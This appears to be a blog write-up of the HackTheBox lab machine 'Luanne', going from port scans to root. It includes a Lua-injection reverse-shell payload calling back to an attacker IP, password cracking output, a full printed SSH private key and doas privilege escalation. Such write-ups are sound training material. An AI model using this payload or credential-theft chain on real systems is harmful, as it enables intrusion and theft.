---
layout: post
title: "Luanne Writeup - HackTheBox"
category: HackTheBox
---
# HTB lab Machine - Luanne

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.140.255 folder that I have attached to this post.

## Enumeration summary

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)

80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized

9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response

Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```

```
User-agent: *
Disallow: /weather  #returning 404 but still harvesting cities 
```

![image-20210504082346836](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504082346836.png)

![image-20210504082411153](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504082411153.png)

```
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

```
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm '.'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
```

```
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'default'
```

```
Summary   : WWW-Authenticate[default][Basic], HTTPServer[Medusa/1.12]
```

```
| http-method-tamper:
[-] [10.129.140.255 tcp/80/nmap-http] |   VULNERABLE:
[-] [10.129.140.255 tcp/80/nmap-http] |   Authentication bypass by HTTP verb tampering
[-] [10.129.140.255 tcp/80/nmap-http] |     State: VULNERABLE (Exploitable)
[*] Task tcp/80/nmap-http on 10.129.140.255 - Nmap script found a potential vulnerability. (State: VULNERABLE)
[-] [10.129.140.255 tcp/80/nmap-http] |       This web server contains password protected resources vulnerable to authentication bypass
[-] [10.129.140.255 tcp/80/nmap-http] |       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
[-] [10.129.140.255 tcp/80/nmap-http] |        common HTTP methods and in misconfigured .htaccess files.
[-] [10.129.140.255 tcp/80/nmap-http] |
[-] [10.129.140.255 tcp/80/nmap-http] |     Extra information:
[-] [10.129.140.255 tcp/80/nmap-http] |
[-] [10.129.140.255 tcp/80/nmap-http] |   URIs suspected to be vulnerable to HTTP verb tampering:
[-] [10.129.140.255 tcp/80/nmap-http] |     / [GENERIC]
[-] [10.129.140.255 tcp/80/nmap-http] |
[-] [10.129.140.255 tcp/80/nmap-http] |     References:
[-] [10.129.140.255 tcp/80/nmap-http] |       http://www.mkit.com.ar/labs/htexploit/
[-] [10.129.140.255 tcp/80/nmap-http] |       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
[-] [10.129.140.255 tcp/80/nmap-http] |       http://www.imperva.com/resources/glossary/http_verb_tampering.html
[-] [10.129.140.255 tcp/80/nmap-http] |_      http://capec.mitre.org/data/definitions/274.html

```



## Exploitation

Dirbuster with wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt found a good old directory for me with some kind of api. Lets try and push it a bit:

![image-20210504083842303](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504083842303.png)

Found default creds for 9001: https://serverfault.com/questions/636493/why-supervisors-http-server-wont-wok

user:123 but I cant see a use for this page yet:

![image-20210504092303311](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504092303311.png)

After some fighting found this to be the city= parameter to create a reverse shell:

```
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.42 1234 >/tmp/f")--
```

Url encode that:

```
%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.42%201234%20%3E%2Ftmp%2Ff%22%29--
```

Used openbsd variant of netcat. Started enumerating:

![image-20210504100541157](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504100541157.png)

A password to crack:

```
kali@kali:~/Desktop/DownloadedScripts$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamthebest       (?)
1g 0:00:00:00 DONE (2021-05-04 10:07) 25.00g/s 76800p/s 76800c/s 76800C/s secrets..ANTHONY
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Unfortunately this is not a system user, but rather an http user:

```
$ cat /etc/passwd
root:*:0:0:Charlie &:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
daemon:*:1:1:The devil himself:/:/sbin/nologin
operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
$ 

```

Started manually enumerating the limited shell I had since the webserver did not amount to anything.

```
$ netstat -a -n | grep LISTEN
tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.22                   *.*                    LISTEN
tcp        0      0  *.9001                 *.*                    LISTEN
tcp6       0      0  *.22                   *.*                    LISTEN

```

What is turning about on 3000 and 3001:

```
$ grep -w 3001 /etc/services    
origo-native       3001/tcp    # OrigoDB Server Native        [Devrex_Labs]                                         [Robert_Friberg]                                                       2013-03-29                                                                        port 3001 previously "Removed on 2006-05-25"
#                  3001        udp    Reserved                                                                                                                                                  2013-03-29                                                                        port 3001 previously "Removed on 2006-05-25"
$ grep -w 3000 /etc/services
hp-3000-telnet     2564/tcp    # HP 3000 NS/VT block mode
hp-3000-telnet     2564/udp    # HP 3000 NS/VT block mode
hbci               3000/tcp    # HBCI                         [Kurt_Haubner]                                        [Kurt_Haubner]
hbci               3000/udp    # HBCI                         [Kurt_Haubner]                                        [Kurt_Haubner]
remoteware-cl      3000/tcp    # RemoteWare Client            [Tim_Farley]                                          [Tim_Farley]                                                                                                                                             This entry records an unassigned but widespread use
remoteware-cl      3000/udp    # RemoteWare Client            [Tim_Farley]                                          [Tim_Farley]                                                                                                                                             This entry records an unassigned but widespread use
$ 

```

Interesting, tried to ssh to r.michaels but I needed the right keys. 3000/3001 seems to serve some kind of filesharing platform. So let me test my luck on an ssh-key:

```
curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa


-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

lol, okay, now we can load that into ssh:

```
kali@kali:~/Desktop/DownloadedScripts$ ssh -i keyfile r.michaels@10.129.140.255
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'keyfile' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "keyfile": bad permissions
r.michaels@10.129.140.255: Permission denied (publickey).
```

Oh right, I need to chmod 600 keyfiles:

```
kali@kali:~/Desktop/DownloadedScripts$ chmod 600 keyfile 
kali@kali:~/Desktop/DownloadedScripts$ ssh -i keyfile r.michaels@10.129.140.255
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ id
uid=1000(r.michaels) gid=100(users) groups=100(users)
luanne$ whoami
r.michaels
luanne$ 

```

Now its linpeas time:

```
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/r.michaels/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R7/bin:/usr/pkg/bin:/usr/pkg/sbin:/usr/games:/usr/local/bin:/usr/local/sbin
New path exported: /home/r.michaels/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R7/bin:/usr/pkg/bin:/usr/pkg/sbin:/usr/games:/usr/local/bin:/usr/local/sbin

```

```
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users

[+] Checking doas.conf
permit r.michaels as root

```

```
[+] Useful software
/usr/bin/nc
/usr/pkg/bin/curl
/sbin/ping
/usr/bin/make
/usr/bin/base64
/usr/pkg/bin/python3.7
/usr/pkg/bin/perl
/usr/pkg/bin/doas

```

Sadly none of this worked. Found and encrypted backup in /home:

```
luanne$ openssl aes-256-cbc -d -in devel_backup-2020-09-16.tar.gz.enc -out /tmp/devel_backup-2020-09-16.tar.gz 
enter aes-256-cbc decryption password:
bad magic number
luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz 
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
luanne$ ls -al /tmp                                                                                            
total 20
drwxrwxrwt   2 root        wheel    48 May  4 15:19 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
-rw-------   1 r.michaels  wheel  1639 May  4 15:19 devel_backup-2020-09-16.tar.gz
luanne$ 

```

Lets browse it:

```
luanne$ tar -xvf devel_backup-2020-09-16.tar.gz                                                                       
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
luanne$ dir
ksh: dir: not found
luanne$ ls
devel-2020-09-16                       devel_backup-2020-09-16.tar.gz
luanne$ cd devel
devel-2020-09-16/                      devel_backup-2020-09-16.tar.gz         
luanne$ cd devel-2020-09-16/                                                                                          
luanne$ dir
ksh: dir: not found
luanne$ ls
webapi www
luanne$ ls -al
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  96 May  4 15:20 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
luanne$ cd www
luanne$ ls -al
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
luanne$ 

```

Cracking again:

```
kali@kali:~/Desktop/DownloadedScripts$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear       (?)
1g 0:00:00:00 DONE (2021-05-04 11:21) 10.00g/s 130560p/s 130560c/s 130560C/s tormenta..hello11
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

This would not be the password for r.michaels right?

```
luanne$ doas su
Password:
sh: Cannot determine current working directory
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
# whoami
root
# pwd
pwd: getcwd() failed: No such file or directory
# ls
# ls -al
# cd /
# dir
sh: dir: not found
# ls
.cshrc   altroot  boot     cdrom    etc      kern     libdata  mnt      proc     rescue   sbin     tmp      var
.profile bin      boot.cfg dev      home     lib      libexec  netbsd   pscmd    root     stand    usr
# cd root
# ls -al
total 36
drwxr-xr-x   2 root  wheel   512 Nov 24 09:30 .
drwxr-xr-x  21 root  wheel   512 Sep 16  2020 ..
-r--r--r--   2 root  wheel  1220 Feb 14  2020 .cshrc
-rw-------   1 root  wheel    59 Feb 14  2020 .klogin
-rw-r--r--   1 root  wheel   212 Feb 14  2020 .login
-r--r--r--   2 root  wheel   701 Feb 14  2020 .profile
-rw-r--r--   1 root  wheel   221 Feb 14  2020 .shrc
-r-x------   1 root  wheel   178 Nov 24 09:57 cleanup.sh
-r--------   1 root  wheel    33 Sep 16  2020 root.txt
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
# 

```

## Final thoughts

This was not an easy box, this is rather hard. And some things are just a bit off. Anyways nice 25 pointer.

